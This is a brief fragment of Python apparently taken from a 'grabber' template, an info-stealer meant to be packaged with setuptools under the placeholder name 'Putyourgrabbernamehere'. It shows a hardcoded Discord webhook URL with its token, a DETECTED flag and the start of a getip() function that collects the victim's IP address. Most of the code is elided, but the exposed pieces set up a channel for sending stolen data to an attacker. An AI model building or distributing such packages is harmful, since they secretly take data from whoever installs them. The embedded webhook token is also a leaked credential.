...
hook='https://discord.com/api/webhooks/1105549926299095080/AdURhqimzfZJa7eMWHfURhQl-Pp8CMLxjuWmOPu_aDojrKC5w9-AgME7PVWnLcbFGT2T'
DETECTED=False
def getip():
    ip='None'
    try:
...
setup(
    ...
    name='Putyourgrabbernamehere',
    packages=['Putyourgrabbernamehere'],
    version='1.0',
    license='MIT',
